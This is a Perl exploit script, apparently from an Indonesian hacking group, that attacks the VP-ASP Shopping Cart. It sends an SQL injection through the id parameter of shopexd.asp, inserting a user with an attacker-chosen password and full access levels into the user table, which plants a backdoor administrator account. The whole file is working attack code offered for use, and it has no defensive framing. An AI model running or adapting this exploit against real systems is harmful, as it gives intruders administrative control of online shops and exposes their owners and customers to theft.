#!/usr/bin/perl
# PRIVATE***PRIVATE***PRIVATE***PRIVATE***PRIVATE***PRIVATE***PRIVATE
# 1ndonesian Security Team (1st)
# ==============================
# VP-ASP Shopping Cart - Exploit
# Discover by : TioEuy & AresU;
# Greetz to: syzwz (ta for da ipod), Bosen, sakitjiwa, muthafuka all
# hackers@centrin.net.id/austnet.org, #romance@centrin.net.id
# http://bosen.net/releases/
use Socket;

$dodolbasik = "tioeuy.pl, VPASP exploit by TioEuy&AresU ";
$aksesnya
="1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29";
$pieldnya = '"fldusername","fldpassword","fldaccess"';

if ($#ARGV<4)
{
  print "\n$dodolbasik";
  print "\n\n Usage: perl tioeuy.pl <server> <full path> <id> <user>
<password> \n\n";
  exit;
}
$kupret="$ARGV[1]shopexd.asp?id=$ARGV[2];insert into tbluser
($pieldnya)
values ('$ARGV[3]','$ARGV[4]','$aksesnya')--";
$kupret=~s/\ /%20/g;
$kupret="GET $kupret HTTP/1.0\r\nHost: $ARGV[0]\r\n\r\n";
print $kupret;

$port=80;
$host=$ARGV[0];
$target = inet_aton($host);
@hasil=sendraw($kupret);
print $gembel;
print @hasil;

# ------------- Sendraw - thanx RFP rfp@wiretrip.net
sub sendraw {   # this saves the whole transaction anyway
        my ($pstr)=@_;

        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
			                     
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        }
}
